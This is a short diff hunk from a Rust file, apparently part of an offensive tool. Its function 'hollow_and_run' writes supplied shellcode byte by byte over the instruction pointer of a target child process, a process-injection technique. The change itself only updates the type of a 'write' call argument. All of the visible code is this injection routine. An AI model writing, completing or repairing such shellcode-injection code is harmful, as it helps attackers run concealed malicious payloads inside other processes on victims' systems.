@@ -24,7 +24,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
             // Write the shellcode over where RIP used to point, one byte at a time
             for byte in shellcode {
                 if let Err(error) =
-                    unsafe { write(child, point as *mut c_void, *byte as *mut c_void) }
+                    write(child, point as *mut c_void, *byte as i64)
                 {
                     panic!("Unable to write portion of shellcode at {byte} to {target_process}: {error}");
                 }
